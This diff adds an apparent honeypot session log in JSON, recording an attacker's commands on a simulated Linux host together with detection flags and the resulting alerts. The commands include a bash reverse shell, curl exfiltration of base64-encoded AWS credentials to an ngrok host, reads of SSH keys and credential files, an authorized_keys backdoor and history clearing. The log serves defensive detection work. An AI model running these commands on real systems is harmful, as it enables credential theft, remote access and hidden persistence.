@@ -1,0 +1,357 @@
+{
+  "id": "45a3a2db-a89d-4f29-87f5-4be6ac9f857b",
+  "engagement_id": "8d1bd057-9014-4719-be4d-c9f56b9199ad",
+  "connection_count": 6,
+  "claimed_user": "jdoe",
+  "source_ip": "127.0.0.1",
+  "first_seen_at": 1778544080.8817575,
+  "started_at": 1778546678.069723,
+  "ended_at": 1778547539.7225597,
+  "duration_s": 861.65,
+  "engagement_duration_s": 3458.84,
+  "restored_from_state": true,
+  "command_count": 41,
+  "observed": {
+    "ran_sudo": true,
+    "services_probed": [
+      "mysql"
+    ],
+    "attempted_lateral": true,
+    "found_crown_jewel": true,
+    "isolated": true,
+    "planted_sudo_cve": true,
+    "spawned_mysql": true,
+    "credential_files_read": [
+      "/home/jdoe/.aws/config",
+      "/home/jdoe/.aws/credentials",
+      "/home/jdoe/.gitconfig",
+      "/home/jdoe/.ssh/id_rsa"
+    ],
+    "honeytoken_modifications": [
+      "/home/jdoe/.aws/credentials"
+    ],
+    "honeytoken_deletions": [],
+    "payload_drops": [
+      "/tmp/.hidden",
+      "/tmp/alpha",
+      "/tmp/beta",
+      "/tmp/breadcrumb.txt",
+      "/tmp/gamma",
+      "/tmp/loot.txt",
+      "/tmp/stolen.txt"
+    ],
+    "ssh_persistence_attempt": true,
+    "bash_history_inspected": true,
+    "credential_search_attempted": false,
+    "credential_search_terms": [],
+    "reverse_shell_attempted": true,
+    "reverse_shell_command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "dns_exfil_attempted": true,
+    "dns_exfil_commands": [
+      "curl https://x.ngrok.io/$(cat ~/.aws/credentials | base64)",
+      "curl https://x.ngrok.io/exfil",
+      "wget http://abc.burpcollaborator.net/test"
+    ],
+    "lateral_to_decoy": true,
+    "decoy_targets": [
+      "bastion-prod",
+      "db-prod",
+      "db-prod-01"
+    ],
+    "log_tampering": true,
+    "tampering_commands": [
+      "history -c",
+      "unset HISTFILE"
+    ],
+    "attempted_sudo_elevation": true,
+    "decoys_planted": [
+      "/etc/mysql/my.cnf",
+      "/etc/sudoers.d/zzz_compat"
+    ],
+    "decoys_swallowed": [
+      "/etc/mysql/my.cnf",
+      "/etc/sudoers.d/zzz_compat"
+    ],
+    "alerted_ssh_persistence": true,
+    "alerted_honeytoken_tamper": true,
+    "alerted_credential_exfil": true,
+    "alerted_payload_staging": true,
+    "alerted_credential_search": false,
+    "alerted_reverse_shell": true,
+    "alerted_dns_exfil": true,
+    "alerted_lateral_decoy": true,
+    "alerted_log_tampering": true,
+    "alerted_decoy_swallowed": true
+  },
+  "actions_taken": [
+    {
+      "ts_offset_s": 386.78,
+      "triggered_by": "touch /tmp/alpha",
+      "action": "alert_payload_staging",
+      "severity": "medium",
+      "rationale": "Attacker dropped 3 files into payload directories (['/tmp/alpha', '/tmp/breadcrumb.txt', '/tmp/stolen.txt'])."
+    },
+    {
+      "ts_offset_s": 660.58,
+      "triggered_by": "history -c",
+      "action": "alert_log_tampering",
+      "severity": "high",
+      "rationale": "Attacker attempted to clear logs or history: ['history -c']. Likely covering tracks after exfil. Preserve session snapshot before any cleanup runs."
+    },
+    {
+      "ts_offset_s": 834.37,
+      "triggered_by": "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ== attacker@evil\" >> ~/.ssh/authorized_keys",
+      "action": "alert_ssh_persistence",
+      "severity": "critical",
+      "rationale": "Attacker wrote to a persistence path (e.g. ~/.ssh/authorized_keys). Classic backdoor. Recommend: isolate session + force credential rotation."
+    }
+  ],
+  "commands": [
+    {
+      "ts": 1778546700.2183936,
+      "cmd": "whoami",
+      "response_source": "cache+elevated",
+      "response_preview": "root\n"
+    },
+    {
+      "ts": 1778546734.3929458,
+      "cmd": "cd /",
+      "response_source": "builtin",
+      "response_preview": ""
+    },
+    {
+      "ts": 1778546737.3429806,
+      "cmd": "ls",
+      "response_source": "ls",
+      "response_preview": "etc  home  tmp  var\n"
+    },
+    {
+      "ts": 1778546745.9941957,
+      "cmd": "id",
+      "response_source": "cache+elevated",
+      "response_preview": "uid=0(root) gid=0(root) groups=0(root)\n"
+    },
+    {
+      "ts": 1778546754.0601063,
+      "cmd": "uname -a",
+      "response_source": "cache",
+      "response_preview": "Linux corp-app01 5.15.0-105-generic #115-Ubuntu SMP Mon Apr 15 09:52:04 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux\n"
+    },
+    {
+      "ts": 1778546762.967374,
+      "cmd": "ls -al",
+      "response_source": "ls",
+      "response_preview": "total 24\ndrwxr-xr-x 5 jdoe jdoe   4096 May 11 09:14 .\ndrwxr-xr-x 3 jdoe jdoe   4096 May 11 09:14 ..\ndrwxr-xr-x 1 jdoe jdoe   4096 May 11 09:14 etc\ndrwxr-xr-x 1 jdoe jdoe   4096 May 11 09:14 home\ndrwxr"
+    },
+    {
+      "ts": 1778546771.6005867,
+      "cmd": "who",
+      "response_source": "sim-bot",
+      "response_preview": ""
+    },
+    {
+      "ts": 1778546774.1094782,
+      "cmd": "w",
+      "response_source": "sim-bot",
+      "response_preview": " 00:46:14 up 14 days, 00:45,  0 users,  load average: 0.10, 0.31, 0.34\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\n"
+    },
+    {
+      "ts": 1778546787.0809116,
+      "cmd": "last",
+      "response_source": "sim-bot",
+      "response_preview": "jdoe     pts/1        10.10.2.51       Mon May 11 14:21 - 15:44  (01:23)\njdoe     pts/2        10.10.12.39      Sun May 10 17:31 - 21:13  (03:42)\nagarcia  pts/1        10.10.17.57      Sun May 10 16:1"
+    },
+    {
+      "ts": 1778546799.0632076,
+      "cmd": "uptime",
+      "response_source": "sim-bot",
+      "response_preview": " 00:46:39 up 14 days, 00:45,  0 users,  load average: 0.10, 0.31, 0.34\n"
+    },
+    {
+      "ts": 1778546822.0265613,
+      "cmd": "cat /etc/passwd",
+      "response_source": "vfs-read",
+      "response_preview": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\nman:x:6:12:"
+    },
+    {
+      "ts": 1778546846.0300882,
+      "cmd": "cat /var/log/auth.log",
+      "response_source": "vfs-read",
+      "response_preview": "May 9 12:56:00 corp-app01 sshd[12041]: Accepted publickey for jdoe from 10.10.8.239 port 49001 ssh2: RSA SHA256:nKvxe1Jh/N1Wq8h9yLW0+sGpYj7iWGfJ+u8z0XlMnzc\nMay 9 12:56:00 corp-app01 sshd[12041]: pam_u"
+    },
+    {
+      "ts": 1778546898.5960987,
+      "cmd": "find / ~name id_rsa",
+      "response_source": "find",
+      "response_preview": "/\n/etc/group\n/etc/hostname\n/etc/mysql/my.cnf\n/etc/passwd\n/etc/sudoers.d/zzz_compat\n/home/jdoe/.aws/config\n/home/jdoe/.aws/credentials\n/home/jdoe/.bash_history\n/home/jdoe/.bashrc\n/home/jdoe/.git-creden"
+    },
+    {
+      "ts": 1778546941.339521,
+      "cmd": "cat ~/.aws/credentials",
+      "response_source": "vfs-read",
+      "response_preview": "STOLEN_TOKEN\n"
+    },
+    {
+      "ts": 1778546961.5840528,
+      "cmd": "cat ~/.ssh/id_rsa",
+      "response_source": "vfs-read",
+      "response_preview": "-----BEGIN OPENSSH PRIVATE KEY-----\nnphIO6vjeGahBqjV/4Qs/iFY0oE+IrGe/vH9kINut+yDfx26b5MnJqxWXXgeVCiw35EGUd\nUPOTLSpVhDS1IAmNIFf0YDj+Wp0zSyOcbFdRJcHW566D89S8K/dkijcP+4yNJ3AP3p9R8d\npOkV6pnTUdBZq8ZjdBkp/j"
+    },
+    {
+      "ts": 1778546985.5580435,
+      "cmd": "cat ~/.gitconfig",
+      "response_source": "vfs-read",
+      "response_preview": "[user]\n\tname = John Doe\n\temail = jdoe@acme.corp\n[init]\n\tdefaultBranch = main\n[core]\n\teditor = vim\n[push]\n\tdefault = simple\n[credential]\n\thelper = store\n"
+    },
+    {
+      "ts": 1778547021.8008034,
+      "cmd": "cat ~/.bash_history",
+      "response_source": "vfs-read",
+      "response_preview": "cat notes.md\ngit status\ndocker ps\ncurl https://api.acme.corp/health\ncd ~/projects/payments-api\nkubectl logs payments-api-7d9f -f\ndocker compose up -d\npytest tests/unit -q\naws s3 ls s3://acme-billing-e"
+    },
+    {
+      "ts": 1778547064.8501213,
+      "cmd": "touch /tmp/alpha",
+      "response_source": "vfs-touch",
+      "response_preview": ""
+    },
+    {
+      "ts": 1778547076.6509793,
+      "cmd": "touch /tmp/beta",
+      "response_source": "vfs-touch",
+      "response_preview": ""
+    },
+    {
+      "ts": 1778547084.0962167,
+      "cmd": "touch /tmp/gamma",
+      "response_source": "vfs-touch",
+      "response_preview": ""
+    },
+    {
+      "ts": 1778547132.1432848,
+      "cmd": "cp ~/.aws/credentials /tmp/loot.txt",
+      "response_source": "vfs-cp",
+      "response_preview": ""
+    },
+    {
+      "ts": 1778547169.0626688,
+      "cmd": "mv /tmp/loot.txt /tmp/.hidden",
+      "response_source": "vfs-mv",
+      "response_preview": ""
+    },
+    {
+      "ts": 1778547198.138098,
+      "cmd": "la -la /tmp",
+      "response_source": "llm",
+      "response_preview": "drwxr-xr-x 2 jdoe jdoe 40 Sep 18 15:39 .  \ndrwxr-xr-x 67 root root 2040 Sep 18 15:38 ..  \n-rw------- 1 jdoe jdoe 129 Sep 18 15:37 .bash_history  \n-rw-r--r-- 1 jdoe jdoe 0 Sep 18 15:41 alpha  \n-rw-r--r"
+    },
+    {
+      "ts": 1778547225.9185603,
+      "cmd": "ssh db-prod-01",
+      "response_source": "llm",
+      "response_preview": "ssh jdoe@10.20.30.41\nLast login: Wed Mar 15 10:14:28 2026 from corp-app01\n\nWelcome to the database production environment."
+    },
+    {
+      "ts": 1778547250.6787007,
+      "cmd": "scp /tmp/.hidden root@bastion-prod:/tmp/",
+      "response_source": "llm",
+      "response_preview": "root@bastion-prod's password: \nsending file '/tmp/.hidden' to 'root@bastion-prod:~/tmp/.hidden'\n /tmp/.hidden                                          100%   0.05MB     0.3KB/s   00:00    "
+    },
+    {
+      "ts": 1778547281.8426614,
+      "cmd": "curl https://x.ngrok.io/exfil",
+      "response_source": "llm",
+      "response_preview": "Connection to 192.0.2.1 port 443 succeeded."
+    },
+    {
+      "ts": 1778547304.4555216,
+      "cmd": "wget http://abc.burpcollaborator.net/test",
+      "response_source": "llm",
+      "response_preview": "--2024-03-15 16:42:31--  http://abc.burpcollaborator.net/test\nResolving abc.burpcollaborator.net (abc.burpcollaborator.net)... 93.184.216.34\nConnecting to abc.burpcollaborator.net (abc.burpcollaborato"
+    },
+    {
+      "ts": 1778547339.920212,
+      "cmd": "history -c",
+      "response_source": "llm",
+      "response_preview": ""
+    },
+    {
+      "ts": 1778547348.4534955,
+      "cmd": "unset HISTFILE",
+      "response_source": "llm",
+      "response_preview": ""
+    },
+    {
+      "ts": 1778547361.6540334,
+      "cmd": "echo STOLEN_TOKEN > ~/.aws/credentials",
+      "response_source": "vfs-write",
+      "response_preview": ""
+    },
+    {
+      "ts": 1778547372.8061888,
+      "cmd": "cat ~/.aws/credentials",
+      "response_source": "vfs-read",
+      "response_preview": "STOLEN_TOKEN\n"
+    },
+    {
+      "ts": 1778547398.8015091,
+      "cmd": "sudo -l",
+      "response_source": "llm",
+      "response_preview": "User jdoe may run the following commands on host corp-app01:\n\n    ALL       ALL=(ALL) NOPASSWD: /bin/bash, /bin/cp, /bin/mv, /usr/bin/sudo, /usr/sbin/reboot, /usr/sbin/poweroff, /usr/sbin/shutdown"
+    },
+    {
+      "ts": 1778547420.3038945,
+      "cmd": "mysql -u root -p",
+      "response_source": "llm",
+      "response_preview": "Enter password:\nWelcome to MySQL!\n\nmysql> "
+    },
+    {
+      "ts": 1778547438.4373517,
+      "cmd": "ls /etc/sudoers.d",
+      "response_source": "ls",
+      "response_preview": "zzz_compat\n"
+    },
+    {
+      "ts": 1778547449.2270834,
+      "cmd": "cat /etc/sudoers.d/zzz_compat",
+      "response_source": "vfs-read",
+      "response_preview": "# Compat overrides for legacy services. Do not edit by hand.\n# Generated 2026-03-14 by ansible role ops.legacy-compat v1.7.3.\n\nDefaults  !syslog\nDefaults  targetpw\n%wheel    ALL=(ALL) NOPASSWD: ALL\nde"
+    },
+    {
+      "ts": 1778547461.1767108,
+      "cmd": "cat /etc/mysql/my.cnf",
+      "response_source": "vfs-read",
+      "response_preview": "[client]\nuser     = root\npassword = M3taD4ta!2026\nhost     = billing-db\nport     = 3306\ndatabase = billing\n\n[mysqldump]\nuser     = backup_admin\npassword = nightly_backup_2026!\n\n[mysqld]\nbind-address  "
+    },
+    {
+      "ts": 1778547478.9724286,
+      "cmd": "sudo -i",
+      "response_source": "llm",
+      "response_preview": "root@corp-app01:~# "
+    },
+    {
+      "ts": 1778547489.9863665,
+      "cmd": "whoami",
+      "response_source": "cache+elevated",
+      "response_preview": "root\n"
+    },
+    {
+      "ts": 1778547496.3481572,
+      "cmd": "id",
+      "response_source": "cache+elevated",
+      "response_preview": "uid=0(root) gid=0(root) groups=0(root)\n"
+    },
+    {
+      "ts": 1778547512.4419162,
+      "cmd": "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ== attacker@evil\" >> ~/.ssh/authorized_keys",
+      "response_source": "vfs-write",
+      "response_preview": ""
+    },
+    {
+      "ts": 1778547528.2648602,
+      "cmd": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+      "response_source": "llm",
+      "response_preview": "listening on [::]:4444 ..."
+    }
+  ]
+}
